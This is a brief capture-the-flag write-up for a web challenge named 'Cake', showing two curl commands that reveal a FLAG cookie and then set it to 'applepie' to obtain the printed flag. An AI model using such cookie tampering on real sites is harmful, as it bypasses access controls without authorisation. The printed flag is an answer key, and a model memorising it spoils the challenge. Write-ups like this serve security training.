# First challanges it s called "Cake"
## Exploit : HTTP Cookie Manipulation


## Challange description : 

```xml
Get the flag from Cake.

We all love applepie.
```

# Solution :

## First, i used curl with the -v (verbose) flag to inspect the `http` headers and the server's response

```
curl -v http://141.85.224.101:31000/ 
```

## In the output, i noticed that the server sends a cookie named `FLAG` with the value empty :

```
Set-Cookie: FLAG=empty
```
<img width="854" height="582" alt="image" src="https://github.com/user-attachments/assets/d6a6c907-6b0c-40be-ab39-d1eef30bff71" />

## Using the hint from the description "applepie" , I tried to send the request again but this time setting the FLAG cookie to applepie.
### To do this i used the -b flag which is used for cookies in curl :

```
curl -v http://141.85.224.101:31000/ -b "FLAG=applepie"
```
<img width="864" height="604" alt="image" src="https://github.com/user-attachments/assets/ef036c38-e2bf-46f6-be64-6ae3c9410057" />


## The server accepted the cookie and returned the flag in the `html`: 

```
SSS{Bhansel_gretel}
```
